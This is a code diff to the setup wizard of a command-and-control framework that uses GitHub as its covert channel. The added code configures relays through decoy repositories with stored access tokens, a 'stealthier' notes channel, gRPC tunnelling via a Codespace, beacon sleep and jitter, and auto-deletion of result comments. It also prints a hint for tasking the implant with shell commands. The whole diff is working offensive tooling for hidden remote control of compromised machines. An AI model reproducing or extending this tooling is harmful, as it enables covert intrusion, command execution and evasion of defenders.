@@ -25,6 +25,15 @@ export interface SetupState {
   appId?: number;
   installationId?: number;
   tentaclePriority?: string;
+  proxyRepos?: string;
+  codespaceName?: string;
+  githubUser?: string;
+  grpcPort?: string;
+  httpUrl?: string;
+  sleepSeconds?: number;
+  jitter?: number;
+  cleanupDays?: number;
+  logLevel?: string;
   envPath?: string;
 }
 
@@ -35,7 +44,7 @@ export async function phaseCredentials(): Promise<{
   owner: string;
   repo: string;
 }> {
-  sectionHeader("1/9  GitHub Credentials");
+  sectionHeader("1/10  GitHub Credentials");
 
   p.note(
     `Your C2 repo is a private GitHub repository where all\n` +
@@ -79,7 +88,7 @@ export async function phaseValidate(
   owner: string,
   repo: string,
 ): Promise<void> {
-  sectionHeader("2/9  Validating GitHub Access");
+  sectionHeader("2/10  Validating GitHub Access");
 
   const result = await withSpinner(
     `Checking ${owner}/${repo}`,
@@ -125,7 +134,7 @@ export async function phaseKeygen(
   owner: string,
   repo: string,
 ): Promise<{ operatorSecret: string; operatorPublicKey: string }> {
-  sectionHeader("3/9  Operator Keypair");
+  sectionHeader("3/10  Operator Keypair");
 
   p.note(
     `Generates an X25519 keypair for end-to-end encryption.\n\n` +
@@ -195,7 +204,7 @@ export async function phaseAuthMode(): Promise<{
   appId?: number;
   installationId?: number;
 }> {
-  sectionHeader("4/9  Beacon Authentication");
+  sectionHeader("4/10  Beacon Authentication");
 
   const mode = await promptSelect<"pat" | "app">({
     message: "How should the beacon authenticate to GitHub?",
@@ -245,7 +254,7 @@ export async function phaseAuthMode(): Promise<{
 // ── Phase 5: Tentacle Selection ──────────────────────────────────────────────
 
 export async function phaseTentacles(): Promise<string | undefined> {
-  sectionHeader("5/9  Covert Channels");
+  sectionHeader("5/10  Covert Channels");
 
   const mode = await promptSelect<"auto" | "custom">({
     message: "Channel selection strategy",
@@ -279,7 +288,186 @@ export async function phaseTentacles(): Promise<string | undefined> {
   return (channels as string[]).join(",");
 }
 
-// ── Phase 6: Write .env ──────────────────────────────────────────────────────
+// ── Phase 6: Advanced Configuration ──────────────────────────────────────────
+
+export interface AdvancedConfig {
+  proxyRepos?: string;
+  codespaceName?: string;
+  githubUser?: string;
+  grpcPort?: string;
+  httpUrl?: string;
+  sleepSeconds?: number;
+  jitter?: number;
+  cleanupDays?: number;
+  logLevel?: string;
+}
+
+export async function phaseAdvanced(): Promise<AdvancedConfig> {
+  sectionHeader("6/10  Advanced Configuration");
+
+  const configure = await promptConfirm({
+    message: "Configure advanced options? (proxy repos, codespace gRPC, sleep tuning)",
+    initialValue: false,
+  });
+
+  if (!configure) return {};
+
+  const config: AdvancedConfig = {};
+
+  // ── Proxy repos ──────────────────────────────────────────────────────────
+  const useProxy = await promptConfirm({
+    message: "Use OctoProxy relay repos?",
+    initialValue: false,
+  });
+
+  if (useProxy) {
+    p.note(
+      `Proxy repos relay beacon traffic through decoy repositories.\n` +
+      `Each entry needs: owner, repo name, and a PAT for that repo.\n\n` +
+      `Format: JSON array of objects with owner, repo, token fields.`,
+      "OctoProxy"
+    );
+
+    const proxyEntries: Array<{ owner: string; repo: string; token: string; innerKind: string }> = [];
+    let addMore = true;
+
+    while (addMore) {
+      const proxyOwner = await promptText({
+        message: "Proxy repo owner",
+        placeholder: "decoy-org",
+        validate: (v) => (!v.trim() ? "Required" : undefined),
+      });
+
+      const proxyRepo = await promptText({
+        message: "Proxy repo name",
+        placeholder: "infra-sync",
+        validate: (v) => (!v.trim() ? "Required" : undefined),
+      });
+
+      const proxyToken = await promptPassword({
+        message: `PAT for ${proxyOwner}/${proxyRepo}`,
+        validate: (v) => (!v.trim() ? "Required" : undefined),
+      });
+
+      const innerKind = await promptSelect<"issues" | "notes">({
+        message: "Inner channel for this proxy",
+        options: [
+          { value: "issues", label: "Issues", hint: "default" },
+          { value: "notes", label: "Notes", hint: "stealthier" },
+        ],
+      });
+
+      proxyEntries.push({
+        owner: proxyOwner.trim(),
+        repo: proxyRepo.trim(),
+        token: proxyToken.trim(),
+        innerKind,
+      });
+
+      addMore = await promptConfirm({ message: "Add another proxy repo?", initialValue: false });
+    }
+
+    config.proxyRepos = JSON.stringify(proxyEntries);
+    p.log.success(`${proxyEntries.length} proxy repo(s) configured`);
+  }
+
+  // ── Codespace gRPC ───────────────────────────────────────────────────────
+  const useCodespace = await promptConfirm({
+    message: "Use Codespace gRPC channel?",
+    initialValue: false,
+  });
+
+  if (useCodespace) {
+    p.note(
+      `The gRPC channel tunnels through a GitHub Codespace via SSH.\n` +
+      `The beacon connects to the Codespace and forwards gRPC traffic\n` +
+      `to the C2 server running inside it.`,
+      "Codespace gRPC"
+    );
+
+    config.codespaceName = (await promptText({
+      message: "Codespace name",
+      placeholder: "org-repo-abc123",
+      validate: (v) => (!v.trim() ? "Required" : undefined),
+    })).trim();
+
+    config.githubUser = (await promptText({
+      message: "GitHub username for SSH auth",
+      placeholder: "your-username",
+      validate: (v) => (!v.trim() ? "Required" : undefined),
+    })).trim();
+
+    config.grpcPort = (await promptText({
+      message: "gRPC port inside Codespace",
+      initialValue: "50051",
+      placeholder: "50051",
+    })).trim();
+  }
+
+  // ── HTTP/WebSocket ───────────────────────────────────────────────────────
+  const useHttp = await promptConfirm({
+    message: "Use HTTP/WebSocket channel?",
+    initialValue: false,
+  });
+
+  if (useHttp) {
+    config.httpUrl = (await promptText({
+      message: "HTTP base URL",
+      placeholder: "https://codespace-8080.app.github.dev",
+      validate: (v) => (!v.trim() ? "Required" : undefined),
+    })).trim();
+  }
+
+  // ── Beacon tuning ────────────────────────────────────────────────────────
+  const tuneSleep = await promptConfirm({
+    message: "Customize beacon sleep interval?",
+    initialValue: false,
+  });
+
+  if (tuneSleep) {
+    const sleepStr = await promptText({
+      message: "Sleep seconds between check-ins",
+      initialValue: "60",
+      validate: (v) => (isNaN(parseInt(v, 10)) ? "Must be a number" : undefined),
+    });
+    config.sleepSeconds = parseInt(sleepStr, 10);
+
+    const jitterStr = await promptText({
+      message: "Jitter factor (0.0–1.0)",
+      initialValue: "0.3",
+      validate: (v) => {
+        const n = parseFloat(v);
+        if (isNaN(n) || n < 0 || n > 1) return "Must be 0.0–1.0";
+      },
+    });
+    config.jitter = parseFloat(jitterStr);
+  }
+
+  // ── Cleanup + logging ────────────────────────────────────────────────────
+  const logLevel = await promptSelect<"info" | "warn" | "error" | "debug">({
+    message: "Log level",
+    options: [
+      { value: "info", label: "Info", hint: "default" },
+      { value: "warn", label: "Warn", hint: "quieter" },
+      { value: "error", label: "Error", hint: "silent except errors" },
+      { value: "debug", label: "Debug", hint: "verbose — for troubleshooting" },
+    ],
+  });
+  if (logLevel !== "info") config.logLevel = logLevel;
+
+  const cleanupStr = await promptText({
+    message: "Auto-cleanup result comments after N days (blank = never)",
+    placeholder: "leave blank to skip",
+  });
+  if (cleanupStr.trim()) {
+    const n = parseInt(cleanupStr, 10);
+    if (!isNaN(n) && n >= 0) config.cleanupDays = n;
+  }
+
+  return config;
+}
+
+// ── Phase 7: Write .env ──────────────────────────────────────────────────────
 
 export interface EnvFileInput {
   token: string;
@@ -290,6 +478,15 @@ export interface EnvFileInput {
   appId?: number;
   installationId?: number;
   tentaclePriority?: string;
+  proxyRepos?: string;
+  codespaceName?: string;
+  githubUser?: string;
+  grpcPort?: string;
+  httpUrl?: string;
+  sleepSeconds?: number;
+  jitter?: number;
+  cleanupDays?: number;
+  logLevel?: string;
 }
 
 export function generateEnvFile(input: EnvFileInput): string {
@@ -321,12 +518,42 @@ export function generateEnvFile(input: EnvFileInput): string {
     lines.push(`SVC_TENTACLE_PRIORITY=${input.tentaclePriority}`);
   }
 
+  if (input.proxyRepos) {
+    lines.push(``);
+    lines.push(`# ── Proxy relay repos ───────────────────────────────────────────────────────`);
+    lines.push(`SVC_PROXY_REPOS='${input.proxyRepos}'`);
+  }
+
+  if (input.codespaceName || input.githubUser) {
+    lines.push(``);
+    lines.push(`# ── Codespace gRPC channel ──────────────────────────────────────────────────`);
+    if (input.codespaceName) lines.push(`SVC_GRPC_CODESPACE_NAME=${input.codespaceName}`);
+    if (input.githubUser) lines.push(`SVC_GITHUB_USER=${input.githubUser}`);
+    if (input.grpcPort) lines.push(`SVC_GRPC_PORT=${input.grpcPort}`);
+  }
+
+  if (input.httpUrl) {
+    lines.push(``);
+    lines.push(`# ── HTTP/WebSocket channel ──────────────────────────────────────────────────`);
+    lines.push(`SVC_HTTP_URL=${input.httpUrl}`);
+  }
+
+  const hasAdvanced = input.sleepSeconds || input.jitter || input.cleanupDays || input.logLevel;
+  if (hasAdvanced) {
+    lines.push(``);
+    lines.push(`# ── Beacon tuning ───────────────────────────────────────────────────────────`);
+    if (input.sleepSeconds) lines.push(`SVC_SLEEP=${input.sleepSeconds}`);
+    if (input.jitter) lines.push(`SVC_JITTER=${input.jitter}`);
+    if (input.cleanupDays !== undefined) lines.push(`SVC_CLEANUP_DAYS=${input.cleanupDays}`);
+    if (input.logLevel) lines.push(`OCTOC2_LOG_LEVEL=${input.logLevel}`);
+  }
+
   lines.push(``);
   return lines.join("\n");
 }
 
 export async function phaseWriteEnv(state: SetupState): Promise<string> {
-  sectionHeader("6/9  Environment File");
+  sectionHeader("7/10  Environment File");
 
   const { resolve } = await import("node:path");
   const defaultPath = resolve(process.cwd().replace(/\/octoctl$/, ""), ".env");
@@ -359,7 +586,7 @@ export async function phaseWriteEnv(state: SetupState): Promise<string> {
 // ── Phase 7: Build Beacon ────────────────────────────────────────────────────
 
 export async function phaseBuildBeacon(state: SetupState): Promise<void> {
-  sectionHeader("7/9  Build Beacon");
+  sectionHeader("8/10  Build Beacon");
 
   const build = await promptConfirm({
     message: "Compile a beacon binary now?",
@@ -403,6 +630,7 @@ export async function phaseBuildBeacon(state: SetupState): Promise<void> {
     args.push("--installation-id", String(state.installationId));
   }
 
+  let buildOutput = "";
   await withSpinner("Compiling beacon", async () => {
     const bunBin = Bun.which("bun") ?? `${process.env.HOME}/.bun/bin/bun`;
     // build-beacon expects cwd = project root (looks for ./implant/src/index.ts)
@@ -423,15 +651,25 @@ export async function phaseBuildBeacon(state: SetupState): Promise<void> {
       const stderr = await new Response(proc.stderr).text();
       throw new Error(`Build failed (exit ${code})${stderr ? `\n${stderr.trim()}` : ""}`);
     }
+    buildOutput = await new Response(proc.stdout).text();
   });
 
-  p.log.success(`Beacon: ${outfile}`);
+  // Extract beacon ID from build-beacon output
+  const idMatch = buildOutput.match(/Beacon ID:\s+(\S+)/);
+  const beaconId = idMatch?.[1];
+
+  const details = [`Path: ${outfile}`];
+  if (beaconId) details.push(`Beacon ID: ${beaconId}`);
+  p.note(details.join("\n"), "Beacon compiled");
+  if (beaconId) {
+    p.log.info(`${DIM}Use this ID for tasking: octoctl task ${beaconId.slice(0, 8)} --kind shell --cmd "id"${RESET}`);
+  }
 }
 
 // ── Phase 8: Install to PATH ─────────────────────────────────────────────────
 
 export async function phaseInstall(): Promise<void> {
-  sectionHeader("8/9  Install CLI");
+  sectionHeader("9/10  Install CLI");
 
   const install = await promptConfirm({
     message: "Add octoctl to PATH? (/usr/local/bin/octoctl)",
@@ -478,7 +716,7 @@ export async function phaseInstall(): Promise<void> {
 // ── Phase 9: Done ────────────────────────────────────────────────────────────
 
 export async function phaseVerify(state: SetupState): Promise<void> {
-  sectionHeader("9/9  Ready");
+  sectionHeader("10/10  Ready");
 
   const steps = [
     `octoctl start                           ${DIM}# launch server + dashboard${RESET}`,
